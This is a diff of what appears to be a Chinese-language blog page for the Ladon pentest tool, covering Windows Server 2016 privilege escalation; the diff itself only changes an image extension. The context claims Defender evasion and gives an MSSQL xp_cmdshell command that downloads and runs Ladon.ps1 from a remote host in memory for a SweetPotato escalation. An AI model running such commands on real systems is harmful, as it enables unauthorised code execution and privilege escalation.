@@ -1253,7 +1253,7 @@ window.location.href="http://k8gege.org/Ladon/win2016_lpe_potato_bypass.html";
 
 <h3 id="Ladon本地用户权限提权"><a href="#Ladon本地用户权限提权" class="headerlink" title="Ladon本地用户权限提权"></a>Ladon本地用户权限提权</h3><p>网上找了些LPE，发现直接被Defender杀，病毒库更新至2021.1.19，Ladon没被杀，管理员UAC权限可通过BypassUac提权<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/win2016_user_lpe.png"></p>
 <h3 id="MSSQL远程加载Ladon提权"><a href="#MSSQL远程加载Ladon提权" class="headerlink" title="MSSQL远程加载Ladon提权"></a>MSSQL远程加载Ladon提权</h3><p>执行SQL查询权限为network service</p>
-<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/sql2016_whoami.png"></p>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/sql2016_whoami.PNG"></p>
 <h4 id="远程内存加载PowerLadon提权"><a href="#远程内存加载PowerLadon提权" class="headerlink" title="远程内存加载PowerLadon提权"></a>远程内存加载PowerLadon提权</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'powershell "IEX (New-Object Net.WebClient).DownloadString('</span><span class="string">'http://xxxxxx.800/Ladon.ps1'</span><span class="string">'); Ladon SweetPotato "whoami""'</span></span><br></pre></td></tr></table></figure>
 
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exp/lpe/win2016_mssql2016.png"></p>
